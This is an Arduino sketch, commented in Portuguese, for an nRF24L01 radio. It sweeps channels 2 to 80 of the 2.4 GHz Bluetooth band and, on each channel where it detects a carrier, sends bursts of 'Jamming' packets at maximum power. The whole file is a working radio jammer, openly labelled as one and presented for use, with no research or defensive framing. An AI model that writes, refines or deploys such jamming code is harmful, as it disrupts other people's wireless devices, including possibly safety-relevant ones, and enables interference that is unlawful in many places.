#include <SPI.h>
#include <RF24.h>

#define CE_PIN   7
#define CSN_PIN  8

RF24 radio(CE_PIN, CSN_PIN);

// Definição dos canais Bluetooth (frequência de 2.402 GHz a 2.480 GHz)
const uint8_t canais_bluetooth[] = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 
  33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 
  63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80
};
const int num_canais = sizeof(canais_bluetooth) / sizeof(canais_bluetooth[0]);

void setup() {
  Serial.begin(9600);
  SPI.begin();
  radio.begin();
  radio.setPALevel(RF24_PA_MAX);
  radio.setDataRate(RF24_250KBPS);
  radio.setAutoAck(false);
  radio.setRetries(0, 0);
  Serial.println("Scanner e interferência em toda a faixa Bluetooth iniciados...");
}

void loop() {
  for (int i = 0; i < num_canais; i++) {
    radio.setChannel(canais_bluetooth[i]);
    radio.startListening();
    delay(5); // Mantém o canal por 5 ms antes de mudar

    if (radio.testCarrier()) {  // Se detectar um sinal forte no canal
      Serial.print("Interferindo no canal: ");
      Serial.println(canais_bluetooth[i]);
      radio.stopListening();

      int numPacotes = 50;  // Enviar 50 pacotes
      for (int j = 0; j < numPacotes; j++) {
        radio.write("Jamming", 7);
        delayMicroseconds(500);  // Intervalo entre os pacotes
      }
    }
  }
}
